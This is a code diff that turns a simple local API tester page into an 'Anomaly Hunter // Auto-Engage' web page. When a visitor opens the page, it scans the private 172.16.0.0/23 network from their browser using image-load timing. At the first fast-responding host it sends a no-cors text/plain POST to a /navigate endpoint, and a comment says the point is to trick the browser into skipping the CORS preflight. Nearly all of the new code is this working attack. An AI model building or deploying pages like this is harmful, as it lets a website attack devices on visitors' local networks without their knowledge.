@@ -1,92 +1,157 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Local API Connectivity Tester</title>
+    <title>Anomaly Hunter // Auto-Engage</title>
     <style>
-        body { background: #111; color: #ddd; font-family: monospace; padding: 20px; }
-        .log-entry { margin: 5px 0; border-bottom: 1px solid #333; padding: 5px; }
-        .error { color: #ff5555; }
-        .success { color: #55ff55; }
-        .info { color: #55aaff; }
-        button { padding: 10px 20px; font-size: 1.2em; cursor: pointer; background: #333; color: #fff; border: 1px solid #555; }
-        button:hover { background: #444; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin: 10px 0; }
+        .stat-line { border-bottom: 1px solid #333; padding: 5px 0; color: #666; display: flex; justify-content: space-between; }
+        #progress-container { width: 100%; background: #222; height: 4px; margin-top: 15px; }
+        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
     </style>
 </head>
 <body>
-    <h1>// LOCAL API TESTER //</h1>
-    <p>Target: <span id="target-display">172.16.1.24:8080</span></p>
+    <h3>// ANOMALY HUNTER [AUTO-ENGAGE] //</h3>
     
-    <button onclick="testNavigate()">Test POST /navigate</button>
-    <button onclick="testSimpleGET()">Test GET / (Simple)</button>
+    <div class="stat-line">
+        <span>TARGET SCOPE:</span> <span>172.16.0.0/23 (Randomized)</span>
+    </div>
+    <div class="stat-line">
+        <span>STATUS:</span> <span id="status">Initializing...</span>
+    </div>
 
-    <h3>LOGS:</h3>
-    <div id="console"></div>
+    <div id="progress-container"><div id="progress-fill"></div></div>
+    <div id="results"></div>
 
     <script>
-        // CONFIGURATION
-        const TARGET_IP = "172.16.1.24"; // Replace with your target IP
-        const PORT = "8080";
-        const BASE_URL = `http://${TARGET_IP}:${PORT}`;
+        // --- CONFIGURATION ---
+        var TARGET_PORT = 8080;
+        var CONCURRENCY = 8;
+        var TIMEOUT = 1500;
+        var GC_INTERVAL = 40;
+        var GC_PAUSE = 100;
 
-        function log(msg, type = "info") {
-            const div = document.createElement("div");
-            div.className = `log-entry ${type}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.getElementById("console").prepend(div);
+        // --- STATE ---
+        var stopScan = false;
+        var queue = [];
+        [0, 1].forEach(subnet => {
+            for(var i=1; i<255; i++) queue.push("172.16." + subnet + "." + i);
+        });
+
+        // Fisher-Yates Shuffle
+        for (let i = queue.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [queue[i], queue[j]] = [queue[j], queue[i]];
         }
 
-        // TEST 1: The Complex POST (Mimicking your curl command)
-        // This triggers a Preflight (OPTIONS) request due to the Content-Type header.
-        function testNavigate() {
-            log(`Attempting POST to ${BASE_URL}/navigate...`, "info");
+        var total = queue.length;
+        var completed = 0;
+        var activeRequests = 0;
+        var processedSinceLastPause = 0;
+
+        // --- SCANNER ---
+        function scanNext() {
+            if(stopScan || queue.length === 0) return;
+            if(activeRequests >= CONCURRENCY) return;
+
+            if(processedSinceLastPause >= GC_INTERVAL) {
+                processedSinceLastPause = 0;
+                setTimeout(scanNext, GC_PAUSE);
+                return;
+            }
+
+            var ip = queue.shift();
+            activeRequests++;
+            processedSinceLastPause++;
+
+            checkIP(ip).then(() => {
+                activeRequests--;
+                updateProgress();
+                scanNext();
+            });
             
-            fetch(`${BASE_URL}/navigate`, {
+            scanNext();
+        }
+
+        function checkIP(ip) {
+            return new Promise(resolve => {
+                if(stopScan) { resolve(); return; }
+
+                var start = performance.now();
+                var img = new Image();
+                var isDone = false;
+
+                var finish = (status) => {
+                    if(isDone) return;
+                    isDone = true;
+                    var time = Math.round(performance.now() - start);
+
+                    // HIT: < 15ms (LAN speed)
+                    if(time < 15 && !stopScan) {
+                        stopScan = true;
+                        executePayload(ip, time);
+                    }
+                    
+                    img.src = ""; 
+                    img = null;
+                    resolve();
+                };
+
+                img.onload = () => finish("load");
+                img.onerror = () => finish("error");
+
+                setTimeout(() => {
+                    if(!isDone) finish("timeout");
+                }, TIMEOUT);
+
+                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
+            });
+        }
+
+        // --- PAYLOAD EXECUTION ---
+        function executePayload(ip, latency) {
+            document.getElementById('status').innerText = "TARGET LOCKED. DEPLOYING PAYLOAD...";
+            
+            // ATTEMPT 1: Send JSON as text/plain (no-cors)
+            // This bypasses the Preflight check. If the server is lenient, it might work.
+            fetch(`http://${ip}:${TARGET_PORT}/navigate`, {
                 method: "POST",
+                mode: "no-cors", 
                 headers: {
-                    "Content-Type": "application/json" // This header triggers CORS Preflight
+                    "Content-Type": "text/plain" // Trick browser into skipping preflight
                 },
-                body: JSON.stringify({
-                    "page": "chrome://new-tab-page"
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    log("SUCCESS: Request sent and accepted.", "success");
-                    return response.json();
-                } else {
-                    log(`SERVER ERROR: HTTP ${response.status}`, "error");
-                }
-            })
-            .then(data => {
-                if(data) log("Response Data: " + JSON.stringify(data), "success");
-            })
-            .catch(error => {
-                // This is where CORS errors will appear
-                log("FETCH FAILED: " + error.message, "error");
-                log("Check your browser DevTools (F12) -> Console for specific CORS errors.", "error");
+                body: JSON.stringify({ "page": "chrome://new-tab-page" }) 
+            }).then(() => {
+                reportSuccess(ip, latency, "Payload Sent (Opaque)");
+            }).catch(e => {
+                reportSuccess(ip, latency, "Payload Failed: " + e);
             });
         }
 
-        // TEST 2: A Simple GET
-        // Simple requests (GET/HEAD) are treated differently but may still fail reading the response.
-        function testSimpleGET() {
-            log(`Attempting GET to ${BASE_URL}/...`, "info");
-            
-            fetch(`${BASE_URL}/`, {
-                method: "GET"
-                // No custom headers
-            })
-            .then(response => {
-                log(`Connected! Status: ${response.status}`, "success");
-                return response.text();
-            })
-            .then(text => {
-                log("Response Body: " + text, "success");
-            })
-            .catch(error => {
-                log("FETCH FAILED: " + error.message, "error");
-            });
+        // --- UI ---
+        function reportSuccess(ip, latency, statusMsg) {
+            var div = document.createElement("div");
+            div.className = "success-box";
+            div.innerHTML = `
+                <h2>>> TARGET: ${ip} (${latency}ms)</h2>
+                <p>Action: ${statusMsg}</p>
+                <p style="font-size:0.8em; color:#888">
+                   Note: If the server strictly requires "application/json" header, 
+                   this request may be ignored by the server even though it was sent.
+                </p>
+            `;
+            document.getElementById('results').appendChild(div);
         }
+
+        function updateProgress() {
+            if(stopScan) return;
+            completed++;
+            var pct = (completed / total) * 100;
+            document.getElementById('progress-fill').style.width = pct + "%";
+            document.getElementById('status').innerText = "SCANNING: " + completed + "/" + total;
+        }
+
+        setTimeout(scanNext, 500);
     </script>
 </body>
 </html>
